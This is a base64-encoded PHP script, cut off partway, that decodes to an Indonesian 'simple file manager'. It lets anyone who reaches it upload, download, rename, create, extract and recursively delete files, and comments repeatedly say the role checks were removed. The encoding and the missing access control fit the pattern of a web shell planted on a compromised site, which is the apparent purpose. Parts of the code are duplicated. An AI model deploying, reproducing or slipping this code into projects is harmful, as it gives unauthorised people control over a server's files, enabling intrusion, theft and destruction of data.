Ci8vIFBlcmlrc2Egcm9sZSBkaWhhcHVzDQogICAgDQogICAgJGl0ZW1zX3RvX2RlbGV0ZSA9ICRfUE9TVFsnZGVsZXRlX2l0ZW1zJ107DQogICAgJGRlbGV0ZWRfY291bnQgPSAwOw0KICAgIA0KICAgIC8vIEZ1bmdzaSByZWt1cnNpZiB1bnR1ayBtZW5naGFwdXMgZm9sZGVyDQogICAgZnVuY3Rpb24gcnJtZGlyKCRkaXIpIHsNCiAgICAgICAgaWYgKGlzX2RpcigkZGlyKSkgew0KICAgICAgICAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRkaXIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJG9iamVjdCkgew0KICAgICAgICAgICAgICAgIGlmICgkb2JqZWN0ICE9ICIuIiAmJiAkb2JqZWN0ICE9ICIuLiIpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2RpcigkZGlyIC4gIi8iIC4gJG9iamVjdCkgJiYgIWlzX2xpbmsoJGRpciAuICIvIiAuICRvYmplY3QpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBycm1kaXIoJGRpciAuICIvIiAuICRvYmplY3QpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgdW5saW5rKCRkaXIgLiAiLyIgLiAkb2JqZWN0KTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBybWRpcigkZGlyKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIA0KICAgIGZvcmVhY2ggKCRpdGVtc190b19kZWxldGUgYXMgJGl0ZW1fbmFtZSkgew0KICAgICAgICAkaXRlbV9wYXRoID0gJGRpciAuIGJhc2VuYW1lKCRpdGVtX25hbWUpOw0KICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGl0ZW1fcGF0aCkpIHsNCiAgICAgICAgICAgIGlmIChpc19maWxlKCRpdGVtX3BhdGgpKSB7DQogICAgICAgICAgICAgICAgaWYgKHVubGluaygkaXRlbV9wYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICAkZGVsZXRlZF9jb3VudCsrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZWlmIChpc19kaXIoJGl0ZW1fcGF0aCkpIHsNCiAgICAgICAgICAgICAgICBpZiAocnJtZGlyKCRpdGVtX3BhdGgpKSB7DQogICAgICAgICAgICAgICAgICAgICRkZWxldGVkX2NvdW50Kys7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIA0KICAgICRtZXNzYWdlID0gIkJlcmhhc2lsIG1lbmdoYXB1cyAiIC4gJGRlbGV0ZWRfY291bnQgLiAiIGl0ZW0uIjsNCiAgICAkc3RhdHVzID0gJ3N1Y2Nlc3MnOw0KICAgIGlmICgkZGVsZXRlZF9jb3VudCA9PT0gMCkgew0KICAgICAgICAkbWVzc2FnZSA9ICJUaWRhayBhZGEgaXRlbSB5YW5nIGJlcmhhc2lsIGRpaGFwdXMuIjsNCiAgICAgICAgJHN0YXR1cyA9ICdkYW5nZXInOw0KICAgIH0NCiAgICANCiAgICBoZWFkZXIoIkxvY2F0aW9uOiAiIC4gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pIC4gIj9wYXRoPSIgLiB1cmxlbmNvZGUoJGRpcikgLiAiJmFsZXJ0X21lc3NhZ2U9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkgLiAiJmFsZXJ0X3N0YXR1cz0iIC4gdXJsZW5jb2RlKCRzdGF0dXMpKTsNCiAgICBleGl0Ow0KfQ0KDQovLyBUYW5nYW5pIHBlcm1pbnRhYW4gYnVhdCBmb2xkZXINCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfUE9TVFsnbmV3X2ZvbGRlcl9uYW1lJ10pKSB7DQovLyBQZXJpa3NhIHJvbGUgZGloYXB1cw0KICAgICRmb2xkZXJfbmFtZSA9IGJhc2VuYW1lKCRfUE9TVFsnbmV3X2ZvbGRlcl9uYW1lJ10pOw0KICAgICRmb2xkZXJfcGF0aCA9ICRkaXIgLiAkZm9sZGVyX25hbWU7DQogICAgJHN0YXR1cyA9ICdkYW5nZXInOw0KDQogICAgaWYgKCFmaWxlX2V4aXN0cygkZm9sZGVyX3BhdGgpKSB7DQogICAgICAgIGlmIChta2RpcigkZm9sZGVyX3BhdGgsIDA3NTUpKSB7DQogICAgICAgICAgICAkbWVzc2FnZSA9ICJGb2xkZXIgIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGZvbGRlcl9uYW1lKSAuICIgYmVyaGFzaWwgZGlidWF0LiI7DQogICAgICAgICAgICAkc3RhdHVzID0gJ3N1Y2Nlc3MnOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJG1lc3NhZ2UgPSAiR2FnYWwgbWVtYnVhdCBmb2xkZXIuIjsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRtZXNzYWdlID0gIkZvbGRlciAiIC4gaHRtbHNwZWNpYWxjaGFycygkZm9sZGVyX25hbWUpIC4gIiBzdWRhaCBhZGEuIjsNCiAgICB9DQoNCiAgICBoZWFkZXIoIkxvY2F0aW9uOiAiIC4gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pIC4gIj9wYXRoPSIgLiB1cmxlbmNvZGUoJGRpcikgLiAiJmFsZXJ0X21lc3NhZ2U9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkgLiAiJmFsZXJ0X3N0YXR1cz0iIC4gdXJsZW5jb2RlKCRzdGF0dXMpKTsNCiAgICBleGl0Ow0KfQ0KDQovLyBUYW5nYW5pIHBlcm1pbnRhYW4gYnVhdCBmaWxlDQppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ25ld19maWxlX25hbWUnXSkpIHsNCi8vIFBlcmlrc2Egcm9sZSBkaWhhcHVzDQogICAgJGZpbGVfbmFtZSA9IGJhc2VuYW1lKCRfUE9TVFsnbmV3X2ZpbGVfbmFtZSddKTsNCiAgICAkZmlsZV9wYXRoID0gJGRpciAuICRmaWxlX25hbWU7DQogICAgJHN0YXR1cyA9ICdkYW5nZXInOw0KDQogICAgaWYgKCFmaWxlX2V4aXN0cygkZmlsZV9wYXRoKSkgew0KICAgICAgICBpZiAodG91Y2goJGZpbGVfcGF0aCkpIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkZpbGUgIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGZpbGVfbmFtZSkgLiAiIGJlcmhhc2lsIGRpYnVhdC4iOw0KICAgICAgICAgICAgJHN0YXR1cyA9ICdzdWNjZXNzJzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkdhZ2FsIG1lbWJ1YXQgZmlsZS4iOw0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJG1lc3NhZ2UgPSAiRmlsZSAiIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZV9uYW1lKSAuICIgc3VkYWggYWRhLiI7DQogICAgfQ0KDQogICAgaGVhZGVyKCJMb2NhdGlvbjogIiAuIGJhc2VuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKSAuICI/cGF0aD0iIC4gdXJsZW5jb2RlKCRkaXIpIC4gIiZhbGVydF9tZXNzYWdlPSIgLiB1cmxlbmNvZGUoJG1lc3NhZ2UpIC4gIiZhbGVydF9zdGF0dXM9IiAuIHVybGVuY29kZSgkc3RhdHVzKSk7DQogICAgZXhpdDsNCn0NCg0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIGVrc3RyYWsNCmlmIChpc3NldCgkX0dFVFsnZXh0cmFjdCddKSkgew0KLy8gUGVyaWtzYSByb2xlIGRpaGFwdXMNCiAgICAkaXRlbV9uYW1lID0gYmFzZW5hbWUoJF9HRVRbJ2V4dHJhY3QnXSk7DQogICAgJGl0ZW1fcGF0aCA9ICRkaXIgLiAkaXRlbV9uYW1lOw0KICAgICRzdGF0dXMgPSAnZGFuZ2VyJzsNCg0KICAgIGlmIChmaWxlX2V4aXN0cygkaXRlbV9wYXRoKSAmJiBpc19maWxlKCRpdGVtX3BhdGgpKSB7DQogICAgICAgIGlmIChleHRyYWN0QXJjaGl2ZSgkaXRlbV9wYXRoLCAkZGlyKSkgew0KICAgICAgICAgICAgdW5saW5rKCRpdGVtX3BhdGgpOyAvLyBIYXB1cyBmaWxlIGFyc2lwIHNldGVsYWggZGlla3N0cmFrDQogICAgICAgICAgICAkbWVzc2FnZSA9ICJGaWxlICIgLiBodG1sc3BlY2lhbGNoYXJzKCRpdGVtX25hbWUpIC4gIiBiZXJoYXNpbCBkaWVrc3RyYWsuIjsNCiAgICAgICAgICAgICRzdGF0dXMgPSAnc3VjY2Vzcyc7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbWVzc2FnZSA9ICJHYWdhbCBtZW5nZWtzdHJhayBmaWxlICIgLiBodG1sc3BlY2lhbGNoYXJzKCRpdGVtX25hbWUpIC4gIi4gUGFzdGlrYW4gZWtzdGVuc2kgUEhQIHlhbmcgZGlwZXJsdWthbiAoemlwLCBwaGFyKSBkaWFrdGlma2FuLiI7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkbWVzc2FnZSA9ICJGaWxlIHRpZGFrIGRpdGVtdWthbiBhdGF1IGJ1a2FuIGZpbGUgYXJzaXAuIjsNCiAgICB9DQogICAgaGVhZGVyKCdMb2NhdGlvbjogJyAuIGJhc2VuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKSAuICc/cGF0aD0nIC4gdXJsZW5jb2RlKCRkaXIpIC4gIiZhbGVydF9tZXNzYWdlPSIgLiB1cmxlbmNvZGUoJG1lc3NhZ2UpIC4gIiZhbGVydF9zdGF0dXM9IiAuIHVybGVuY29kZSgkc3RhdHVzKSk7DQogICAgZXhpdDsNCn0NCg0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIGhhcHVzIChzaW5nbGUgZGVsZXRlKQ0KaWYgKGlzc2V0KCRfR0VUWydkZWxldGUnXSkpIHsNCi8vIFBlcmlrc2Egcm9sZSBkaWhhcHVzDQogICAgJGl0ZW1fbmFtZSA9IGJhc2VuYW1lKCRfR0VUWydkZWxldGUnXSk7DQogICAgJGl0ZW1fcGF0aCA9ICRkaXIgLiAkaXRlbV9uYW1lOw0KICAgICRzdGF0dXMgPSAnZGFuZ2VyJzsNCg0KICAgIC8vIFBpbmRhaGthbiBmdW5nc2kgcGVuZ2hhcHVzYW4gcmVrdXJzaWYga2UgbHVhcg0KICAgIGZ1bmN0aW9uIHJybWRpcigkZGlyKSB7DQogICAgICAgIGlmIChpc19kaXIoJGRpcikpIHsNCiAgICAgICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkZGlyKTsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRvYmplY3QpIHsNCiAgICAgICAgICAgICAgICBpZiAoJG9iamVjdCAhPSAiLiIgJiYgJG9iamVjdCAhPSAiLi4iKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJGRpciAuICIvIiAuICRvYmplY3QpICYmICFpc19saW5rKCRkaXIgLiAiLyIgLiAkb2JqZWN0KSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcnJtZGlyKCRkaXIgLiAiLyIgLiAkb2JqZWN0KTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHVubGluaygkZGlyIC4gIi8iIC4gJG9iamVjdCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBybWRpcigkZGlyKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICBpZiAoZmlsZV9leGlzdHMoJGl0ZW1fcGF0aCkpIHsNCiAgICAgICAgaWYgKGlzX2ZpbGUoJGl0ZW1fcGF0aCkpIHsNCiAgICAgICAgICAgIHVubGluaygkaXRlbV9wYXRoKTsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkZpbGUgIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGl0ZW1fbmFtZSkgLiAiIGJlcmhhc2lsIGRpaGFwdXMuIjsNCiAgICAgICAgICAgICRzdGF0dXMgPSAnc3VjY2Vzcyc7DQogICAgICAgIH0gZWxzZWlmIChpc19kaXIoJGl0ZW1fcGF0aCkpIHsNCiAgICAgICAgICAgIHJybWRpcigkaXRlbV9wYXRoKTsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkZvbGRlciAiIC4gaHRtbHNwZWNpYWxjaGFycygkaXRlbV9uYW1lKSAuICIgYmVyaGFzaWwgZGloYXB1cy4iOw0KICAgICAgICAgICAgJHN0YXR1cyA9ICdzdWNjZXNzJzsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRtZXNzYWdlID0gIkl0ZW0gdGlkYWsgZGl0ZW11a2FuLiI7DQogICAgfQ0KICAgIGhlYWRlcignTG9jYXRpb246ICcgLiBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSkgLiAnP3BhdGg9JyAuIHVybGVuY29kZSgkZGlyKSAuICImYWxlcnRfbWVzc2FnZT0iIC4gdXJsZW5jb2RlKCRtZXNzYWdlKSAuICImYWxlcnRfc3RhdHVzPSIgLiB1cmxlbmNvZGUoJHN0YXR1cykpOw0KICAgIGV4aXQ7DQp9DQoNCi8vIFRhbmdhbmkgcGVybWludGFhbiB1bmR1aA0KaWYgKGlzc2V0KCRfR0VUWydkb3dubG9hZCddKSkgew0KICAgICRmaWxlX25hbWUgPSBiYXNlbmFtZSgkX0dFVFsnZG93bmxvYWQnXSk7DQogICAgJGZpbGVfdG9fZG93bmxvYWQgPSAkZGlyIC4gJGZpbGVfbmFtZTsNCiAgICBpZiAoZmlsZV9leGlzdHMoJGZpbGVfdG9fZG93bmxvYWQpICYmIGlzX2ZpbGUoJGZpbGVfdG9fZG93bmxvYWQpKSB7DQogICAgICAgIGhlYWRlcignQ29udGVudC1UeXBlOiAnIC4gbWltZV9jb250ZW50X3R5cGUoJGZpbGVfdG9fZG93bmxvYWQpKTsNCiAgICAgICAgaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0iJyAuIGJhc2VuYW1lKCRmaWxlX3RvX2Rvd25sb2FkKSAuICciJyk7DQogICAgICAgIHJlYWRmaWxlKCRmaWxlX3RvX2Rvd25sb2FkKTsNCiAgICAgICAgZXhpdDsNCiAgICB9DQp9DQoNCg0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIHVuZ2dhaCBmaWxlDQppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX0ZJTEVTWydmaWxlVG9VcGxvYWQnXSkpIHsNCi8vIFBlcmlrc2Egcm9sZSBkaWhhcHVzDQogICAgJHRhcmdldF9maWxlID0gJGRpciAuIGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGVUb1VwbG9hZCddWyduYW1lJ10pOw0KICAgICR1cGxvYWRPayA9IDE7DQogICAgJG1lc3NhZ2UgPSAnJzsNCiAgICAkc3RhdHVzID0gJ2Rhbmdlcic7IC8vIERlZmF1bHQgc3RhdHVzIHRvIGRhbmdlcg0KDQogICAgaWYgKGZpbGVfZXhpc3RzKCR0YXJnZXRfZmlsZSkpIHsNCiAgICAgICAgJG1lc3NhZ2UgPSAiTWFhZiwgZmlsZSBzdWRhaCBhZGEuIjsNCiAgICAgICAgJHVwbG9hZE9rID0gMDsNCiAgICB9DQoNCiAgICBpZiAoJF9GSUxFU1snZmlsZVRvVXBsb2FkJ11bJ3NpemUnXSA+IDUwMDAwMDApIHsNCiAgICAgICAgJG1lc3NhZ2UgPSAiTWFhZiwgdWt1cmFuIGZpbGUgdGVybGFsdSBiZXNhci4iOw0KICAgICAgICAkdXBsb2FkT2sgPSAwOw0KICAgIH0NCg0KICAgIGlmICgkdXBsb2FkT2sgPT0gMCkgew0KICAgICAgICAkbWVzc2FnZSA9ICJNYWFmLCBmaWxlIEFuZGEgdGlkYWsgdGVydW5nZ2FoLiAiIC4gJG1lc3NhZ2U7DQogICAgfSBlbHNlIHsNCiAgICAgICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlVG9VcGxvYWQnXVsndG1wX25hbWUnXSwgJHRhcmdldF9maWxlKSkgew0KICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRmlsZSAiIC4gaHRtbHNwZWNpYWxjaGFycyhiYXNlbmFtZSgkX0ZJTEVTWydmaWxlVG9VcGxvYWQnXVsnbmFtZSddKSkgLiAiIGJlcmhhc2lsIGRpdW5nZ2FoLiI7DQogICAgICAgICAgICAkc3RhdHVzID0gJ3N1Y2Nlc3MnOyAvLyBTZXQgc3RhdHVzIHRvIHN1Y2Nlc3MNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIk1hYWYsIHRlcmphZGkga2VzYWxhaGFuIHNhYXQgbWVuZ3VuZ2dhaCBmaWxlLiI7DQogICAgICAgIH0NCiAgICB9DQogICAgaGVhZGVyKCJMb2NhdGlvbjogIiAuIGJhc2VuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKSAuICI/cGF0aD0iIC4gdXJsZW5jb2RlKCRkaXIpIC4gIiZhbGVydF9tZXNzYWdlPSIgLiB1cmxlbmNvZGUoJG1lc3NhZ2UpIC4gIiZhbGVydF9zdGF0dXM9IiAuIHVybGVuY29kZSgkc3RhdHVzKSk7DQogICAgZXhpdDsNCn0NCg0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIGdhbnRpIG5hbWENCmlmIChpc3NldCgkX1BPU1RbJ3JlbmFtZV9vbGRfbmFtZSddKSAmJiBpc3NldCgkX1BPU1RbJ3JlbmFtZV9uZXdfbmFtZSddKSkgew0KLy8gUGVyaWtzYSByb2xlIGRpaGFwdXMNCiAgICAkb2xkX25hbWUgPSBiYXNlbmFtZSgkX1BPU1RbJ3JlbmFtZV9vbGRfbmFtZSddKTsNCiAgICAkbmV3X25hbWUgPSBiYXNlbmFtZSgkX1BPU1RbJ3JlbmFtZV9uZXdfbmFtZSddKTsNCiAgICAkc3RhdHVzID0gJ2Rhbmdlcic7DQoNCiAgICBpZiAoZmlsZV9leGlzdHMoJGRpciAuICRvbGRfbmFtZSkpIHsNCiAgICAgICAgaWYgKHJlbmFtZSgkZGlyIC4gJG9sZF9uYW1lLCAkZGlyIC4gJG5ld19uYW1lKSkgew0KICAgICAgICAgICAgJG1lc3NhZ2UgPSAiQmVyaGFzaWwgbWVuZ2dhbnRpIG5hbWEgIiAuIGh0bWxzcGVjaWFsY2hhcnMoJG9sZF9uYW1lKSAuICIgbWVuamFkaSAiIC4gaHRtbHNwZWNpYWxjaGFycygkbmV3X25hbWUpIC4gIi4iOw0KICAgICAgICAgICAgJHN0YXR1cyA9ICdzdWNjZXNzJzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkdhZ2FsIG1lbmdnYW50aSBuYW1hLiI7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkbWVzc2FnZSA9ICJGaWxlIHRpZGFrIGRpdGVtdWthbi4iOw0KICAgIH0NCiAgICBoZWFkZXIoIkxvY2F0aW9uOiAiIC4gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pIC4gIj9wYXRoPSIgLiB1cmxlbmNvZGUoJGRpcikgLiAiJmFsZXJ0X21lc3NhZ2U9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkgLiAiJmFsZXJ0X3N0YXR1cz0iIC4gdXJsZW5jb2RlKCRzdGF0dXMpKTsNCiAgICBleGl0Ow0KfQ0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIHVuZHVoDQppZiAoaXNzZXQoJF9HRVRbJ2Rvd25sb2FkJ10pKSB7DQogICAgJGZpbGVfbmFtZSA9IGJhc2VuYW1lKCRfR0VUWydkb3dubG9hZCddKTsNCiAgICAkZmlsZV90b19kb3dubG9hZCA9ICRkaXIgLiAkZmlsZV9uYW1lOw0KICAgIGlmIChmaWxlX2V4aXN0cygkZmlsZV90b19kb3dubG9hZCkgJiYgaXNfZmlsZSgkZmlsZV90b19kb3dubG9hZCkpIHsNCiAgICAgICAgaGVhZGVyKCdDb250ZW50LVR5cGU6ICcgLiBtaW1lX2NvbnRlbnRfdHlwZSgkZmlsZV90b19kb3dubG9hZCkpOw0KICAgICAgICBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInIC4gYmFzZW5hbWUoJGZpbGVfdG9fZG93bmxvYWQpIC4gJyInKTsNCiAgICAgICAgcmVhZGZpbGUoJGZpbGVfdG9fZG93bmxvYWQpOw0KICAgICAgICBleGl0Ow0KICAgIH0NCn0NCg0KJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLi4nKSk7DQoNCi8vIEZ1bmdzaSB1bnR1ayBtZW5kYXBhdGthbiBpa29uIGJlcmRhc2Fya2FuIGVrc3RlbnNpIGZpbGUNCmZ1bmN0aW9uIGdldEZpbGVJY29uKCRmaWxlbmFtZSkgew0KICAgICRleHRlbnNpb24gPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSk7DQogICAgc3dpdGNoICgkZXh0ZW5zaW9uKSB7DQogICAgICAgIGNhc2UgJ2pwZyc6DQogICAgICAgIGNhc2UgJ2pwZWcnOg0KICAgICAgICBjYXNlICdwbmcnOg0KICAgICAgICBjYXNlICdnaWYnOg0KICAgICAgICBjYXNlICdibXAnOg0KICAgICAgICBjYXNlICdzdmcnOg0KICAgICAgICAgICAgcmV0dXJuICdmYXIgZmEtaW1hZ2UnOw0KICAgICAgICBjYXNlICdtcDQnOg0KICAgICAgICBjYXNlICdhdmknOg0KICAgICAgICBjYXNlICdtb3YnOg0KICAgICAgICBjYXNlICdta3YnOg0KICAgICAgICBjYXNlICczZ3AnOg0KICAgICAgICAgICAgcmV0dXJuICdmYXIgZmEtZmlsZS12aWRlbyc7DQogICAgICAgIGNhc2UgJ21wMyc6DQogICAgICAgIGNhc2UgJ3dhdic6DQogICAgICAgIGNhc2UgJ29nZyc6DQogICAgICAgICAgICByZXR1cm4gJ2ZhciBmYS1maWxlLWF1ZGlvJzsNCiAgICAgICAgY2FzZSAncGRmJzoNCiAgICAgICAgICAgIHJldHVybiAnZmFyIGZhLWZpbGUtcGRmJzsNCiAgICAgICAgY2FzZSAnemlwJzoNCiAgICAgICAgY2FzZSAncmFyJzoNCiAgICAgICAgY2FzZSAndGFyJzoNCiAgICAgICAgY2FzZSAnZ3onOg0KICAgICAgICAgICAgcmV0dXJuICdmYXIgZmEtZmlsZS1hcmNoaXZlJzsNCiAgICAgICAgY2FzZSAnZG9jJzoNCiAgICAgICAgY2FzZSAnZG9jeCc6DQogICAgICAgICAgICByZXR1cm4gJ2ZhciBmYS1maWxlLXdvcmQnOw0KICAgICAgICBjYXNlICd4bHMnOg0KICAgICAgICBjYXNlICd4bHN4JzoNCiAgICAgICAgICAgIHJldHVybiAnZmFyIGZhLWZpbGUtZXhjZWwnOw0KICAgICAgICBjYXNlICdwcHQnOg0KICAgICAgICBjYXNlICdwcHR4JzoNCiAgICAgICAgICAgIHJldHVybiAnZmFyIGZhLWZpbGUtcG93ZXJwb2ludCc7DQogICAgICAgIGNhc2UgJ3R4dCc6DQogICAgICAgIGNhc2UgJ2xvZyc6DQogICAgICAgIGNhc2UgJ21kJzoNCiAgICAgICAgICAgIHJldHVybiAnZmFyIGZhLWZpbGUtYWx0JzsNCiAgICAgICAgY2FzZSAncGhwJzoNCiAgICAgICAgY2FzZSAnaHRtbCc6DQogICAgICAgIGNhc2UgJ2Nzcyc6DQogICAgICAgIGNhc2UgJ2pzJzoNCiAgICAgICAgY2FzZSAnanNvbic6DQogICAgICAgIGNhc2UgJ3htbCc6DQogICAgICAgICAgICByZXR1cm4gJ2ZhciBmYS1maWxlLWNvZGUnOw0KICAgICAgICBjYXNlICdyYXInOg0KICAgICAgICAgICAgcmV0dXJuICdmYXMgZmEtZmlsZS1hcmNoaXZlJzsNCiAgICAgICAgY2FzZSAnaW1nJzoNCiAgICAgICAgICAgIHJldHVybiAnZmFzIGZhLWhkZCc7DQogICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICByZXR1cm4gJ2ZhciBmYS1maWxlJzsNCiAgICB9DQp9DQo/Pg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJpZCI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDx0aXRsZT5NYW5hamVyIEZpbGUgU2VkZXJoYW5hPC90aXRsZT4NCiAgICA8bGluayBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjMuMi9kaXN0L2Nzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4NCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2ZvbnQtYXdlc29tZS82LjQuMi9jc3MvYWxsLm1pbi5jc3MiPg0KICAgIDxzdHlsZT4NCiAgICAgICAgYm9keSB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2h0dHBzOi8vY2RuLmRyaWJiYmxlLmNvbS91c2VydXBsb2FkLzI3NDM1NjQxL2ZpbGUvb3JpZ2luYWwtODdlM2NkN2IwZjhhOTE1N2ZlMmIyZjEwNDIxMjUzY2IuZ2lmJyk7IA0KICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsgDQogICAgICAgICAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KICAgICAgICAgICAgYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtcG9zaXRpb246IGNlbnRlcjsNCiAgICAgICAgICAgIGNvbG9yOiAjZmZmZmZmOw0KICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQogICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDB2aDsNCiAgICAgICAgICAgICAgICAvKiBNZW5hbWJhaGthbiBwcm9wZXJ0aSB1bnR1ayB0ZWtzIGFnYXIgdGlkYWsgbWVtZWNhaCBiYXJpcyAqLw0KICAgICAgICAgICAgICAgICAgICAgICAgd29yZC1icmVhazogYnJlYWstYWxsOyAvKiBNZW1lY2FoIGthdGEgcGFuamFuZyBkaSBtYW5hIHNhamEgKi8NCiAgICAgICAgb3ZlcmZsb3ctd3JhcDogYnJlYWstd29yZDsgLyogU3RhbmRhciBtb2Rlcm4gdW50dWsgbWVtZWNhaCBrYXRhICovDQogICAgICAgIH0NCiAgICAgIC5jb250YWluZXIgew0KICAgICAgICBtYXgtd2lkdGg6IDkwMHB4Ow0KICAgICAgICB3b3JkLWJyZWFrOiBicmVhay1hbGw7IC8qIE1lbWVjYWgga2F0YSBwYW5qYW5nIGRpIG1hbmEgc2FqYSAqLw0KICAgICAgICBvdmVyZmxvdy13cmFwOiBicmVhay13b3JkOyAvKiBTdGFuZGFyIG1vZGVybiB1bnR1ayBtZW1lY2FoIGthdGEgKi8NCiAgICAgICAgfQ0KDQoNCiAgICAgICAgLmljb24geyB3aWR0aDogMS4ycmVtOyB9DQogICAgICAgIGEgew0KICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KICAgICAgICAgICAgY29sb3I6ICNiYzAwOTk7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDFweCBibGFjazsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDgpOw0KICAgICAgICAgICAgcGFkZGluZzogNHB4Ow0KICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDFweCAxcHggI2UzZGYxMjsNCiAgICAgICAgfQ0KICAgICAgICBhOmhvdmVyIHsNCiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgICAgICAgICAgIGNvbG9yOiAjYzRjNGM0Ow0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCAxcHggd2hpdGVzbW9rZTsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7DQogICAgICAgICAgICBiYWNrZ3J